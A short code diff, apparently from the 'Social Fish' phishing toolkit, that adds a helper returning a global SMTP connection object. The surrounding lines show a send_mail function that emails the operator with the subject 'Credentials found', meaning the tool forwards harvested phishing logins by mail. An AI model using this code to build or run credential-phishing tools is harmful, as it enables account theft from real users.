@@ -42,6 +42,12 @@ def connect_smtp(domain,port,login,passwd):
     except IndexError:
         return
 
+def objsmtp():
+    try:
+        return obj_smtp
+    except NameError:
+        return
+
 def send_mail(msg, fish):
 
     msg_mail = 'Subject: Social Fish - Credentials found: {user}\r\n\r\n'.format(user=msg[0])
